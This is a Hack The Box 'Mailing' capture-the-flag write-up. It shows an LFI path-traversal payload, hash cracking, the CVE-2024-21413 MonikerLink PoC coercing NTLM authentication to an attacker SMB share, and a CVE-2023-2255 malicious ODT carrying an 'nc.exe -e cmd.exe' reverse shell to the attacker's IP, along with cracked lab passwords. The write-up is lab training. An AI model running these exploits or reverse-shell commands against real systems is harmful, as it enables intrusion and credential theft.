---
{"dg-publish":true,"permalink":"/ct-fs/htb/mailing/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #hMailServer #LFI #MonikerLink #LibreOffice

## Recon
![Pasted image 20260819192817.png](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260819192817.png)

### Nmap:
```zsh
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.129.232.39
------------------------------------------------------------
Scanning target 10.129.232.39
Time started: 2026-08-19 19:34:29.641971
------------------------------------------------------------
Port 25 is open
Port 143 is open
Port 80 is open
Port 110 is open
Port 135 is open
Port 139 is open
Port 445 is open
Port 465 is open
Port 587 is open
Port 993 is open
Port 5040 is open
Port 5985 is open
Port 7680 is open
Port 47001 is open
Port 49665 is open
Port 49667 is open
Port 49666 is open
Port 49664 is open
Port 49668 is open
Port 54821 is open
Port scan completed in 0:01:39.186765
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p25,143,80,110,135,139,445,465,587,993,5040,5985,7680,47001,49665,49667,49666,49664,49668,54821 -sV -sC -T4 -Pn -oA 10.129.232.39 10.129.232.39
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p25,143,80,110,135,139,445,465,587,993,5040,5985,7680,47001,49665,49667,49666,49664,49668,54821 -sV -sC -T4 -Pn -oA 10.129.232.39 10.129.232.39
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 19:36 -0400
Nmap scan report for 10.129.232.39
Host is up (0.094s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: SORT IDLE completed ACL QUOTA RIGHTS=texkA0001 IMAP4rev1 CAPABILITY IMAP4 OK NAMESPACE CHILDREN
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: SORT IDLE completed ACL QUOTA RIGHTS=texkA0001 IMAP4rev1 CAPABILITY IMAP4 OK NAMESPACE CHILDREN
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54821/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 2s
| smb2-time: 
|   date: 2026-08-19T23:38:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.14 seconds
------------------------------------------------------------
```
Initial portscan reveals typical windows ports as well as ports open for a mail server (IMAP, POP3, SMTP, etc.) as well as a webserver running on port 80
### Port 80
#### Tech Stack
```html
┌──(kali㉿kali)-[~/CTF/HTB/mailing]
└─$ curl -v http://mailing.htb
* Host mailing.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.232.39
*   Trying 10.129.232.39:80...
* Established connection to mailing.htb (10.129.232.39 port 80) from 10.10.14.192 port 44048 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: mailing.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
< Server: Microsoft-IIS/10.0
< X-Powered-By: PHP/8.3.3
< X-Powered-By: ASP.NET
< Date: Thu, 20 Aug 2026 02:29:56 GMT
< Content-Length: 4681
< 
```

#### Manual Enumeration
![Pasted image 20260819194107.png](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260819194107.png)
![Pasted image 20260819194047.png\|1308](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260819194047.png)
Visiting in the browser we see a webserver describing this mail server There are three people mentioned in the site `Ruy Alonso`, `Maya Bendito`, `Gregory Smith`. Clicking through to `Download Instructions` we find a PDF that gives instructions for setting up their mail in whatever email app you like to use. We do see that the instructions leak Maya's email as `maya@mailing.htb`. I'm going to make a user list for the three users we found before. 

![Pasted image 20260819194615.png](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260819194615.png)
Hovering over the download link we see that it's using a GET request with inline parameter of `file=instructions.pdf`. We can check for LFI and SQL injection here.

![Pasted image 20260819194947.png](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260819194947.png)
![Pasted image 20260819195032.png](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260819195032.png)
Trying several payloads we finally get a hit with `file=../../../../../../../../windows/win.ini`. LFI confirmed. Now let's see if we can enumerate users.

#### Fuzzing valid file structure

```php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
```
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing]
└─$ ffuf -c -v -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://mailing.htb/download.php?file=../FUZZ -fw 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mailing.htb/download.php?file=../FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 87ms]
| URL | http://mailing.htb/download.php?file=../assets
    * FUZZ: assets

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 95ms]
| URL | http://mailing.htb/download.php?file=../.
    * FUZZ: .

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 91ms]
| URL | http://mailing.htb/download.php?file=../Assets
    * FUZZ: Assets

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 94ms]
| URL | http://mailing.htb/download.php?file=../instructions
    * FUZZ: instructions

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 94ms]
| URL | http://mailing.htb/download.php?file=../con
    * FUZZ: con

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 95ms]
| URL | http://mailing.htb/download.php?file=../Instructions
    * FUZZ: Instructions

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 88ms]
| URL | http://mailing.htb/download.php?file=../aux
    * FUZZ: aux

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 96ms]
| URL | http://mailing.htb/download.php?file=../prn
    * FUZZ: prn

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 92ms]
| URL | http://mailing.htb/download.php?file=../ASSETS
    * FUZZ: ASSETS

```
we begin by fuzzing one directory up since we know the current directory for our vuln at `/downloads.php` sits inside `C:\wwwroot\instructions\` on the server. This means we can enumerate valid folders inside the webroot to see if we can leak out some config files.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing]
└─$ ffuf -c -v -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://mailing.htb/download.php?file=../FUZZ.php -fw 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mailing.htb/download.php?file=../FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

[Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 132ms]
| URL | http://mailing.htb/download.php?file=../index.php
    * FUZZ: index

[Status: 200, Size: 721, Words: 146, Lines: 23, Duration: 139ms]
| URL | http://mailing.htb/download.php?file=../download.php
    * FUZZ: download

[Status: 200, Size: 721, Words: 146, Lines: 23, Duration: 102ms]
| URL | http://mailing.htb/download.php?file=../Download.php
    * FUZZ: Download

[Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 89ms]
| URL | http://mailing.htb/download.php?file=../Index.php
    * FUZZ: Index

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 122ms]
| URL | http://mailing.htb/download.php?file=../con.php
    * FUZZ: con

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 90ms]
| URL | http://mailing.htb/download.php?file=../aux.php
    * FUZZ: aux

[Status: 200, Size: 721, Words: 146, Lines: 23, Duration: 99ms]
| URL | http://mailing.htb/download.php?file=../DownLoad.php
    * FUZZ: DownLoad

[Status: 200, Size: 721, Words: 146, Lines: 23, Duration: 91ms]
| URL | http://mailing.htb/download.php?file=../DOWNLOAD.php
    * FUZZ: DOWNLOAD

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 104ms]
| URL | http://mailing.htb/download.php?file=../prn.php
    * FUZZ: prn

[Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 100ms]
| URL | http://mailing.htb/download.php?file=../INDEX.php
    * FUZZ: INDEX

:: Progress: [43007/43007] :: Job [1/1] :: 441 req/sec :: Duration: [0:01:54] :: Errors: 0 ::
```
Adding a php file extension we see known-good endpoints that we've accessed previously respond with 200 responses.

##### Users
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing]
└─$ ffuf -c -v -w /usr/share/seclists/Usernames/Names/names.txt -u http://mailing.htb/download.php?file=../../../../../../../Users/FUZZ -fw 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mailing.htb/download.php?file=../../../../../../../Users/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 86ms]
| URL | http://mailing.htb/download.php?file=../../../../../../../Users/con
    * FUZZ: con

[Status: 500, Size: 1213, Words: 71, Lines: 30, Duration: 98ms]
| URL | http://mailing.htb/download.php?file=../../../../../../../Users/maya
    * FUZZ: maya

:: Progress: [10713/10713] :: Job [1/1] :: 415 req/sec :: Duration: [0:00:27] :: Errors: 0 :
```
We also fuzz for possible users and see that we get back one `maya` from our PDF before.

### Port 110 (POP3)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing]
└─$ nc -C -nv 10.129.232.39 110
(UNKNOWN) [10.129.232.39] 110 (pop3) open
+OK POP3
capa
+OK CAPA list follows
USER
UIDL
TOP
.
USER maya
+OK Send your password
pass test
-ERR Invalid user name or password. Please use full email address as user name
```
knowing we validated our user `maya` on the server we attempt to login with a random password to the POP3 instance and get a verbose error stating we need to use the full email as the username. Let's see if we can brute her password with `Hydra` given this syntactical correction. 

This ends up getting us blocked by the server for too many errors and connection attempts...


## Initial Access
### Local File Inclusion
![Pasted image 20260820122316.png](/img/user/CTFs/HTB/Images/Mailing%20Images/Pasted%20image%2020260820122316.png)
After some googling we finally find the location of the config file for this mail server.

```zsh
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=
```
In it we are greeted with two password hashes.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing/exploit]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
homenetworkingadministrator (?)     
1g 0:00:00:00 DONE (2026-08-20 15:25) 4.347g/s 32878Kp/s 32878Kc/s 32878KC/s homerandme..homejame
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```
Successfully crack the hash for the `AdministratorPassword`. Let's see if we can abuse this password as `maya`

### CVE-2024-21413
```zsh
┌──(kali㉿kali)-[~/…/mailing/exploit/moniker/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.192\smbFolder\test.txt' --subject TEST

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.

┌──(kali㉿kali)-[~/…/mailing/exploit/moniker/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ impacket-smbserver smbFolder $(pwd) -smb2support -debug
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Config file parsed
[+] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[+] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.93.1,50770)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:838c941b73c70309eac4574c58090b2d:0101000000000000809eb2d1de30dd01723106ef908258d6000000000100100058004b00620048006b0063004c004a000300100058004b00620048006b0063004c004a0002001000550064004b006c00740042006300770004001000550064004b006c00740042006300770007000800809eb2d1de30dd010600040002000000080030003000000000000000000000000020000053ce3438eaf818705d8523ba0ca6fb582c6dd45fb4b0c1a847833ec109edc9f20a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390032000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found CTF
[-] SMB2_TREE_CONNECT not found CTF
^C
Interrupted, exiting...
^CTraceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1543, in _shutdown
    _thread_shutdown()
KeyboardInterrupt
```
Found [POC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) for CVE-2024-21413 (AKA "MonikerLink Exploit") and sent email to user `maya` to coerce her system to authenticate back to an smb server we have setup on our machine. We successfully capture `maya's` hash.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing/exploit]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt maya.txt              
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m4y4ngs4ri       (maya)     
1g 0:00:00:01 DONE (2026-08-20 16:21) 0.7194g/s 4268Kp/s 4268Kc/s 4268KC/s m61405..m4895621
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
We successfully cracked `maya's` hash to get her PC password.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing/exploit]
└─$ evil-winrm -i 10.129.93.1 -u maya -p 'm4y4ngs4ri'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> 

```
We successfully get a shell on the server as `maya`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/mailing/exploit]
└─$ nxc smb mailing.htb -u 'maya' -p 'm4y4ngs4ri' --rid-brute
SMB         10.129.93.1     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:None)
SMB         10.129.93.1     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
SMB         10.129.93.1     445    MAILING          500: MAILING\Administrador (SidTypeUser)
SMB         10.129.93.1     445    MAILING          501: MAILING\Invitado (SidTypeUser)
SMB         10.129.93.1     445    MAILING          503: MAILING\DefaultAccount (SidTypeUser)
SMB         10.129.93.1     445    MAILING          504: MAILING\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.93.1     445    MAILING          513: MAILING\Ninguno (SidTypeGroup)
SMB         10.129.93.1     445    MAILING          1001: MAILING\localadmin (SidTypeUser)
SMB         10.129.93.1     445    MAILING          1002: MAILING\maya (SidTypeUser
```
We enumerate the users on the machine via `nxc`
## Privilege Escalation
### LibreOffice CVE-2023-2255
```zsh
*Evil-WinRM* PS C:\> type 'Program Files\LibreOffice\program\version.ini'
[Version]
AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update
MsiProductVersion=7.4.0.1
ProductCode={A3C6520A-E485-47EE-98CC-32D6BB0529E4}
ReferenceOOoMajorMinor=4.1
UpdateChannel=
UpdateID=LibreOffice_7_en-US_af_am_ar_as_ast_be_bg_bn_bn-IN_bo_br_brx_bs_ca_ca-valencia_ckb_cs_cy_da_de_dgo_dsb_dz_el_en-GB_en-ZA_eo_es_et_eu_fa_fi_fr_fur_fy_ga_gd_gl_gu_gug_he_hsb_hi_hr_hu_id_is_it_ja_ka_kab_kk_km_kmr-Latn_kn_ko_kok_ks_lb_lo_lt_lv_mai_mk_ml_mn_mni_mr_my_nb_ne_nl_nn_nr_nso_oc_om_or_pa-IN_pl_pt_pt-BR_ro_ru_rw_sa-IN_sat_sd_sr-Latn_si_sid_sk_sl_sq_sr_ss_st_sv_sw-TZ_szl_ta_te_tg_th_tn_tr_ts_tt_ug_uk_uz_ve_vec_vi_xh_zh-CN_zh-TW_zu
UpdateURL=https://update.libreoffice.org/check.php
UpgradeCode={4B17E523-5D91-4E69-BD96-7FD81CFA81BB}
UpdateUserAgent=<PRODUCT> (${buildid}; ${_OS}; ${_ARCH}; <OPTIONAL_OS_HW_DATA>)
Vendor=The Document Foundation


┌──(kali㉿kali)-[~/…/HTB/mailing/exploit/CVE-2023-2255]
└─$ python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.192 1337" --output exploit.odt
File exploit.odt has been created !
```
Found LibreOffice installed on the server and relevant [POC](https://github.com/elweth-sec/CVE-2023-2255). We pass a `netcat` reverse shell command to the script and it outputs a malicious `odt` file. 

```zsh
*Evil-WinRM* PS C:\programdata> upload /usr/share/windows-resources/binaries/nc.exe
                                        
Info: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\programdata\nc.exe
                                        
Data: 79188 bytes of 79188 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\> cd "Important Documents"
*Evil-WinRM* PS C:\Important Documents> wget http://10.10.14.192:8090/exploit.odt -outfile exploit.odt
*Evil-WinRM* PS C:\Important Documents> 

```
We then upload `nc.exe` to the system at `C:\ProgramData` as well as move into `C:\Important Documents` as this seemed like the best candidate for documents being read on the server. Once inside we download our `exploit.odt`.

```zsh
┌──(kali㉿kali)-[~/…/HTB/mailing/exploit/CVE-2023-2255]
└─$ nc -lnvp 1337                                
listening on [any] 1337 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.93.1] 52965
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
mailing\localadmin

C:\Program Files\LibreOffice\program>
```
We successfully catch a reverse shell to our listener as `localadmin`. pwned.



## Final Thoughts
>[!Takeaways]
>- If a CTF is asking you to use an exploit that requires another user to authenticate or click be sure to have a responder session or some such listener going to intercept it.
>- Be sure to fully read the documentation on the app that you attack for configuration files
>- Add uncommon programs and root-level directories in to your Windows privesc checklist
>- evil-winrm has `upload` which can be used to upload netcat to make payloads less complex


